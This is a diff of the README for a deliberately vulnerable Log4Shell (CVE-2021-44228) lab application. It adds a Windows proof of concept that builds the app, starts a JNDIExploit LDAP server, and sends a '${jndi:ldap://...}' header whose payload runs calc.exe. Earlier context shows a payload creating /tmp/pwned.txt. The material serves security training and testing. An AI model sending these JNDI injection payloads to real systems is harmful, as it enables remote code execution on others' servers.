@@ -1,6 +1,7 @@
 # Log4Shell sample vulnerable application (CVE-2021-44228)
 
-This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
+This repository contains a Spring Boot web application vulnerable to CVE-2021-44228,
+nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
 
 It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.
 
@@ -30,12 +31,14 @@ And to send the exploit:
 
     curl 127.0.0.1:8080 -H 'X-Api-Version: <PAYLOAD>'
 
-
 ## Exploitation steps
 
-*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*
+*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/)
+. **Run at your own risk, preferably in a VM in a sandbox environment**.*
 
-**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). Just append `web.archive.org` in front of the JNDIExploit download URL below to use the version cached by the Wayback Machine.*
+**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (
+presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). Just append `web.archive.org` in
+front of the JNDIExploit download URL below to use the version cached by the Wayback Machine.*
 
 * Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server
 
@@ -68,7 +71,8 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/
 [+] Response Code: 200
 ```
 
-* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:
+* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container
+  running the vulnerable application:
 
 ```
 $ docker exec vulnerable-app ls /tmp
@@ -86,3 +90,24 @@ https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
 
 [@christophetd](https://twitter.com/christophetd)
 [@rayhan0x01](https://twitter.com/rayhan0x01)
+
+## TL;DR POC (Windows)
+
+### Start vulnerable target
+
+    git clone https://github.com/HenryFBP/log4shell-vulnerable-app
+    cd log4shell-vulnerable-app
+    gradle clean bootJar --no-daemon
+    start cmd.exe /k java -jar ./build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar
+
+### Start attacker's LDAP server
+
+    git clone https://github.com/HenryFBP/JNDI-Exploit-Server
+    cd JNDI-Exploit-Server
+    mvn clean package
+    start cmd.exe /k java -jar JNDIExploit.jar
+
+### Send payload to vulnerable target (need GNU curl.exe...)
+
+    choco install -y curl
+    curl.exe 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://localhost:1389/Basic/Command/Base64/Y2FsYy5leGU=}'
